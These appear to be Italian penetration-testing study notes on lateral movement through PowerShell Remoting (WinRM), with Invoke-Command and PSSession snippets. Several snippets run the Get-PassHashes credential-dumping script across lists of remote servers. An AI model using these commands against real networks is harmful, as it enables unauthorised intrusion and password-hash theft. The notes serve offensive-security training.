# Lateral Movement - PowerShell Remoting

* `PowerShellRemoting (PSRemoting)` puo' essere considerato un `psexec on steroids` ma molto piu' stealth e veloce
* PSRemoting `utilzza Windows Remote Management (WinRM)` che e' l'implementazione di Microsoft di WS-Management
* Attivo di default sui Server2012 e successivi con un eccezione firewall
* Utilizza `WinRM` ed e' in ascolto di `default` sulle `porte 5985 (HTTP) e 5986 (HTTPS)`
* E' il modo suggerito dalle best-practice per gestire i Windows Core Server
* Il processo di Remoting gira come un processo ad alta integrita', garantendo un ottima opportunita' per l'elevazione dei priviliegi&#x20;

### **Uno ad Uno**

* PSSession
  * Interattivo
  * Viene eseguito in un nuovo processo (`wsmprovhost`)
  * e' state-full
* cmdlets utili
  * <kbd>New-PSSession</kbd>
  * <kbd>Enter-PSSession</kbd>

### Uno a molti

* Conosciuto anche come Fan-out remoting
  * Non interattivo
  * Esegue comandi in parallello
* cmdlets utili
  * <kbd>Invoke-Command</kbd>



* Utilizza il seguente snippet per `eseguire`` `**`comandi o scriptblock`**

{% code fullWidth="true" %}
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}

* Utilizza il seguente snippet per `eseguire`` `**`file`**&#x20;

{% code fullWidth="true" %}
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}

* Utilizza il seguente snippet per `eseguire`` `**`funzioni caricate localmente`**` ``sulle macchine remote`&#x20;

{% code fullWidth="true" %}
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```
{% endcode %}

* Utilizza il seguente snippet per  `passare argument`    SOLO ARGOMENTI POSIZIONALI  &#x20;

{% code fullWidth="true" %}
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```
{% endcode %}

* Utilizza il seguente snippet per eseguire  comandi "Stateful" utilizzando Invoke-Command

```powershell
 $Sess = New-PSSession -Computername Server1
 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
 Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```
